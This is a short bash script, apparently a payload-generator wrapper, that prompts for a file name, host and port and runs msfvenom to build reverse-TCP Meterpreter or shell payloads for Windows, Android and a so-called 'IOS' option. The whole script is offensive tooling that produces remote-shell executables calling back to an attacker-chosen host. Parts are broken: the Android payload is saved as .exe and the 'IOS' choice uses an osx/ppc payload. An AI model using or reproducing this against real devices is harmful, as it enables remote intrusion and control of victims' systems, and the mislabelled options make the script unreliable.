#!/bin/bash

function Payloads()
{
	echo "Choose Your Payload:"

	echo "[1] Windows"
	echo "[2] Android"
	echo "[3] IOS"
	read Payload
	clear -x
	if [[ $Payload = 1 ]]; then
		echo "Please Enter File Name:"
		read Name
		echo "Please Enter The Host:"
		read Host
		echo "Please Enter The Port"
		read Port
		echo "Making The Payload..."
		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$Host LPORT=$Port -f exe -o ~/$Name.exe
	elif [[ $Payload = 2 ]]; then
		#statements
		echo "Please Enter File Name:"
		read Name
		echo "Please Enter The Host:"
		read Host
		echo "Please Enter The Port"
		read Port
		echo "Making The Payload..."
		msfvenom -p Android/meterpreter/reverse_tcp LHOST=$Host LPORT=$Port R -o ~/$Name.exe
		clear -x
	elif [[ $Payload = 3 ]]; then
		#statements
		echo "Please Enter File Name:"
		read Name
		echo "Please Enter The Host:"
		read Host
		echo "Please Enter The Port:"
		read Port
		echo "Making The Payload..."
		msfvenom -p osx/ppc/shell/reverse_tcp LHOST=$Host LPORT=$Port R -o ~/$Name.exe
		clear -x
		echo "Enjoy!! :)"
	fi
}
Payloads